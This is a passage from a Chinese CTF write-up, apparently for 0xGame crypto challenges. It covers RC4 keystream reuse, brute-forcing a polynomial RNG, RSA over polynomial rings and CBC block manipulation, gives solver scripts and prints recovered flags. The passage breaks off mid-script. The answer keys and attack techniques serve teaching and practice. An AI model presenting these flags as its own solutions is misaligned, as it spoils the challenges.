<p>得到<img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20251009211926304.png" alt="image-20251009211926304"></p>
<p>flag:<code>0xgame&#123;ECC_1s_4w3s0m3_but_n0t_perf3ct&#125;</code></p>
<h2 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h2><p>已知加密key的明文是key*5,加密flag是32字节，所以msg也是32字节。两个密文是同一个RC4密钥加密的，我们可以求出密钥流的前32字节:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keystream = ciphertext_key[:<span class="number">32</span>] ⊕ P2[:<span class="number">32</span>]</span><br></pre></td></tr></table></figure>

<p>然后用该密钥就能求出msg：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msg = ciphertext_flag ⊕ keystream</span><br></pre></td></tr></table></figure>

<p>完整解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ciphertext_flag = <span class="string">b&#x27;n\xab\xa8\xf6%\xf5\xbd\xc5\x97\xe0\xa0zCpV&#123;\x04&amp;\x8a\xe5\xe1TP\xe0&#x27;</span></span><br><span class="line">ciphertext_key = <span class="string">b&#x27;\x83=x&#123;\xbcb\r^3nl\xbe\xf4\xdb\xe5\xc5\x86\x9e-Rt\xf9\x93\t\x883I\xdd\xcdx\x01&quot;\xb6d\xd3A\xa47|\x8d\xf8\xe9\xb1\x04\xfaz\x83t\xd5\x85\xd19\xfd\xbc\x88\xc8\x05fJZ\xae\xba%\x04B\xd6a&gt;\xf7\xc6B\xc0`\xc2\xc4\x10\x83BbJ&#x27;</span></span><br><span class="line"></span><br><span class="line">key_known = <span class="string">b&quot;This is keyyyyyy&quot;</span> * <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取前 32 字节</span></span><br><span class="line">key_part = key_known[:<span class="number">32</span>]</span><br><span class="line">cipher_key_part = ciphertext_key[:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">keystream = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(cipher_key_part, key_part))</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertext_flag, keystream))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;msg =&quot;</span>, msg)</span><br><span class="line"><span class="built_in">print</span>(msg.decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>后面发现这居然是GBK编码 ( ?   于是加了这一行<code>print(msg.decode(&#39;gbk&#39;))</code>，得到flag：<code>0xGame&#123;哈哈哈没想到我是中文的吧&#125;</code></p>
<h2 id="LCG"><a href="#LCG" class="headerlink" title="LCG"></a>LCG</h2><p>RNG&#x3D;1，得到<code>Encrypted flag: [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]</code>所以flag是36字节。</p>
<p>先找RNG状态序列：从 <code>seed=1</code> 开始迭代 RNG，直到状态重复，记录所有状态序列 <code>states</code>。</p>
<p>枚举a和b：因为 <code>a</code> 和 <code>b</code> 是 <code>states[k1]</code> 和 <code>states[k2]</code>，其中 <code>k1, k2</code> 在 <code>[1, 1024]</code> 范围内（因为 <code>random.randint(1, 1024)</code>），所以取 <code>a = states[i]</code>, <code>b = states[j]</code>，其中 <code>i</code> 和 <code>j</code> 从 1 到 min(1024, len(states))</p>
<p>完整exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"></span><br><span class="line">MOD = <span class="number">2</span>**<span class="number">32</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">coefficients = [<span class="number">77549</span>, <span class="number">468297</span>, <span class="number">447715</span>, <span class="number">99019</span>, <span class="number">1039399</span>, <span class="number">618114</span>, <span class="number">67952</span>, <span class="number">512021</span>, <span class="number">390981</span>, <span class="number">412152</span>]</span><br><span class="line">enc_flag = [<span class="number">1935545177</span>, <span class="number">482262980</span>, <span class="number">1684118578</span>, <span class="number">997149554</span>, <span class="number">47161616</span>, <span class="number">102144924</span>, <span class="number">4155440928</span>, <span class="number">2213608845</span>, <span class="number">3538556139</span>, <span class="number">2928111657</span>, <span class="number">1154771317</span>, <span class="number">2133944243</span>, <span class="number">4148979403</span>, <span class="number">858055706</span>, <span class="number">3202218392</span>, <span class="number">1727302179</span>, <span class="number">3882966344</span>, <span class="number">1327689887</span>, <span class="number">3674970320</span>, <span class="number">2187841171</span>, <span class="number">2311252450</span>, <span class="number">482971802</span>, <span class="number">1729193547</span>, <span class="number">358579918</span>, <span class="number">927519716</span>, <span class="number">1913893602</span>, <span class="number">1846075319</span>, <span class="number">1560219121</span>, <span class="number">3400251736</span>, <span class="number">2548802464</span>, <span class="number">684657754</span>, <span class="number">989524061</span>, <span class="number">324600525</span>, <span class="number">197683993</span>, <span class="number">1609214168</span>, <span class="number">3772472918</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RNG</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, coefficients, seed, MOD=<span class="number">2</span>**<span class="number">20</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.coefficients = coefficients</span><br><span class="line">        <span class="variable language_">self</span>.state = seed</span><br><span class="line">        <span class="variable language_">self</span>.MOD = MOD</span><br><span class="line">        <span class="variable language_">self</span>.f = <span class="keyword">lambda</span> x: <span class="built_in">sum</span>(c * (x ** i) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(coefficients)) % MOD</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.state = <span class="variable language_">self</span>.f(<span class="variable language_">self</span>.state)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.state</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 RNG 状态序列（足够长，比如 5000 个状态，确保覆盖循环）</span></span><br><span class="line">seed = <span class="number">1</span></span><br><span class="line">rng = RNG(coefficients, seed)</span><br><span class="line">states = [seed]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5000</span>):</span><br><span class="line">    nxt = rng.<span class="built_in">next</span>()</span><br><span class="line">    <span class="keyword">if</span> nxt == states[<span class="number">0</span>]:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    states.append(nxt)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Generated <span class="subst">&#123;<span class="built_in">len</span>(states)&#125;</span> unique RNG states&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举 a 和 b 的可能值（索引从 1 到 1024）</span></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">min</span>(<span class="number">1025</span>, <span class="built_in">len</span>(states))):</span><br><span class="line">    a = states[i]</span><br><span class="line">    <span class="keyword">if</span> gcd(a, MOD) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    inv_a = inverse(a, MOD)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">min</span>(<span class="number">1025</span>, <span class="built_in">len</span>(states))):</span><br><span class="line">        b = states[j]</span><br><span class="line">        plain = []</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> enc_flag:</span><br><span class="line">            possible_byte = <span class="literal">None</span></span><br><span class="line">            state_val = c</span><br><span class="line">            <span class="comment"># 反向 1 到 1024 步</span></span><br><span class="line">            <span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1025</span>):</span><br><span class="line">                state_val = (state_val - b) * inv_a % MOD</span><br><span class="line">                <span class="keyword">if</span> <span class="number">0</span> &lt;= state_val &lt;= <span class="number">255</span>:</span><br><span class="line">                    <span class="keyword">if</span> possible_byte <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        possible_byte = state_val</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># 如果多个步数都得到合法字节，需要选择，这里先取第一个</span></span><br><span class="line">                        <span class="comment"># 实际上应该检查一致性，我们先简单处理</span></span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">if</span> possible_byte <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            plain.append(possible_byte)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(plain) == <span class="built_in">len</span>(enc_flag):</span><br><span class="line">            <span class="comment"># 检查是否可打印 ASCII</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = <span class="built_in">bytes</span>(plain).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">32</span> &lt;= p &lt; <span class="number">127</span> <span class="keyword">for</span> p <span class="keyword">in</span> plain):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Found: a=<span class="subst">&#123;a&#125;</span>, b=<span class="subst">&#123;b&#125;</span>, plaintext = <span class="subst">&#123;text&#125;</span>&quot;</span>)</span><br><span class="line">                    found = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not found with given constraints.&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">p = Integer(<span class="number">211381997162225534712606028333737323293</span>)</span><br><span class="line">q = Integer(<span class="number">291844321073146066895055929747029949743</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义多项式环</span></span><br><span class="line">Rp.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line">Rq.&lt;x&gt; = PolynomialRing(GF(q))</span><br><span class="line">Rn.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义模 x^8 - 1</span></span><br><span class="line">Sp = Rp.quotient(x^<span class="number">8</span> - <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">Sq = Rq.quotient(x^<span class="number">8</span> - <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">Sn = Rn.quotient(x^<span class="number">8</span> - <span class="number">1</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文多项式系数</span></span><br><span class="line">c_coeffs = [<span class="number">40882135200347703593754473549436673146387957409540306808209934514868940052992</span>,</span><br><span class="line">            <span class="number">13673861744940819052324430973254902841262867940443611208276249322420769352299</span>,</span><br><span class="line">            <span class="number">14825937682750201471490037222143248112539971745568733623844924679519292569979</span>,</span><br><span class="line">            <span class="number">38679688295547579683397975810830690182925250157203662993481664387755200460738</span>,</span><br><span class="line">            <span class="number">48188456496545346035512990878010917911654453288374940837147218298761674630209</span>,</span><br><span class="line">            <span class="number">573073037892837477865699910635548796182825197336726898256762153949994844160</span>,</span><br><span class="line">            <span class="number">33191976337303879621137795936787377133622652419928253776624421127421475322069</span>,</span><br><span class="line">            <span class="number">46680445255028101113817388282005859237776046219558912765486646689142241483104</span>]</span><br><span class="line"></span><br><span class="line">c_poly = Sn(c_coeffs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算单位群阶</span></span><br><span class="line">order_p = (p-<span class="number">1</span>)^<span class="number">2</span> * (p^<span class="number">2</span> - <span class="number">1</span>) * (p^<span class="number">4</span> - <span class="number">1</span>)</span><br><span class="line">order_q = (q-<span class="number">1</span>)^<span class="number">2</span> * (q^<span class="number">2</span> - <span class="number">1</span>) * (q^<span class="number">4</span> - <span class="number">1</span>)</span><br><span class="line">order = lcm(order_p, order_q)</span><br><span class="line">d = inverse_mod(e, order)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">m_poly = c_poly^d</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取系数</span></span><br><span class="line">m_coeffs = [Integer(m_poly[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的系数:&quot;</span>, m_coeffs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查系数是否在字节范围内</span></span><br><span class="line"><span class="keyword">for</span> i, coeff <span class="keyword">in</span> <span class="built_in">enumerate</span>(m_coeffs):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;系数 <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;coeff&#125;</span> (在 0-255 内: <span class="subst">&#123;<span class="number">0</span> &lt;= coeff &lt;= <span class="number">255</span>&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果在字节范围内，转为字符</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= coeff &lt;= <span class="number">255</span> <span class="keyword">for</span> coeff <span class="keyword">in</span> m_coeffs):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> m_coeffs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密失败：系数不在 ASCII 范围内&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;尝试用 long_to_bytes 方式:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag_bytes = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> coeff <span class="keyword">in</span> m_coeffs:</span><br><span class="line">            <span class="comment"># 将大整数转为字节</span></span><br><span class="line">            <span class="keyword">while</span> coeff &gt; <span class="number">0</span>:</span><br><span class="line">                flag_bytes = <span class="built_in">bytes</span>([coeff % <span class="number">256</span>]) + flag_bytes</span><br><span class="line">                coeff //= <span class="number">256</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Flag bytes:&quot;</span>, flag_bytes)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误:&quot;</span>, e)</span><br></pre></td></tr></table></figure>

<p>得到<code>0xGame&#123;D0_y0u_l1k3_RSA_w1th_p0lyn0m14l_r1ngs?&#125;</code></p>
<h2 id="CCB"><a href="#CCB" class="headerlink" title="CCB"></a>CCB</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given IV</span></span><br><span class="line">IV = b64decode(<span class="string">&quot;Mkoz9OBLUA4EgWqbuheBcg==&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;IV: <span class="subst">&#123;IV.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 1: Create C-B-C pattern</span></span><br><span class="line"><span class="comment"># We need C1 = C3 != C2</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># For CBC mode:</span></span><br><span class="line"><span class="comment"># C1 = E(P1 ⊕ IV)</span></span><br><span class="line"><span class="comment"># C2 = E(P2 ⊕ C1)</span></span><br><span class="line"><span class="comment"># C3 = E(P3 ⊕ C2)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Strategy: </span></span><br><span class="line"><span class="comment"># 1. Choose P1 and P2 arbitrarily</span></span><br><span class="line"><span class="comment"># 2. Encrypt to get C1, C2</span></span><br><span class="line"><span class="comment"># 3. Set P3 = P1 ⊕ IV ⊕ C2 so that P3 ⊕ C2 = P1 ⊕ IV</span></span><br><span class="line"><span class="comment">#    This makes C3 = E(P3 ⊕ C2) = E(P1 ⊕ IV) = C1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Step 1: Creating C-B-C ciphertext ===&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Strategy: Choose P1, P2, then set P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;This will make C3 = C1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the first encryption, we can choose any P1 and P2</span></span><br><span class="line"><span class="comment"># But we need to know C1 and C2 to compute P3</span></span><br><span class="line"><span class="comment"># So we&#x27;ll need to do this interactively</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nFirst, encrypt with P1=00...00 (16 zeros), P2=01...01, P3=00...00 (temporary)&quot;</span>)</span><br><span class="line">P1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">P2 = <span class="string">b&#x27;\x01&#x27;</span> * <span class="number">16</span></span><br><span class="line">P3_temp = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">plaintext1_temp = P1 + P2 + P3_temp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Temporary plaintext (base64): <span class="subst">&#123;b64encode(plaintext1_temp).decode()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;After getting C1 and C2 from server, calculate:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Then encrypt again with the corrected plaintext&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Step 2: Creating C-C-B ciphertext ===&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;After getting C and B from step 1:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;We need C1 = C2 = C and C3 = B&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nStrategy:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1. Set P1 such that E(P1 ⊕ IV) = C&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;   So P1 = D(C) ⊕ IV - but we can&#x27;t decrypt without the key&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nAlternative strategy:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Since C1 from step 1 satisfies C1 = E(P1 ⊕ IV),&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;We need to reuse that same P1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;For C2 = C1, we need E(P2 ⊕ C1) = C1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;So P2 ⊕ C1 = P1 ⊕ IV&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Therefore P2 = P1 ⊕ IV ⊕ C1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nFor C3 = B (which is C2 from step 1):&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;We need E(P3 ⊕ C2) = B&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Since C2 = C1 (both equal to C), P3 ⊕ C1 = P2_old ⊕ C1_old&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;From step 1, C2_old = E(P2_old ⊕ C1_old) = B&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;So we need P3 ⊕ C = P2_old ⊕ C (where C = C1_old)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Therefore P3 = P2_old&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Practical Solution ===&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1. Get IV from server&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;2. Encrypt P1||P2||temp with P1=zeros, P2=ones to get C1||C2||C3_temp&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;3. Calculate P3 = P1 ⊕ IV ⊕ C2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;4. Encrypt P1||P2||P3 to get C||B||C (C-B-C pattern)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;5. Calculate P2&#x27; = P1 ⊕ IV ⊕ C&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;6. Encrypt P1||P2&#x27;||P2 to get C||C||B (C-C-B pattern)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;7. Get flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Helper function to XOR bytes</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n=== Interactive Solver ===&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Step 1: Use option 1 to encrypt this plaintext:&quot;</span>)</span><br><span class="line">P1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">P2 = <span class="string">b&#x27;\xff&#x27;</span> * <span class="number">16</span>  <span class="comment"># Changed to all 0xFF to ensure P2 != P1</span></span><br><span class="line">P3_temp = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">plaintext_temp = P1 + P2 + P3_temp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;b64encode(plaintext_temp).decode()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nAfter you get the ciphertext, paste it here (base64):&quot;</span>)</span><br><span class="line"><span 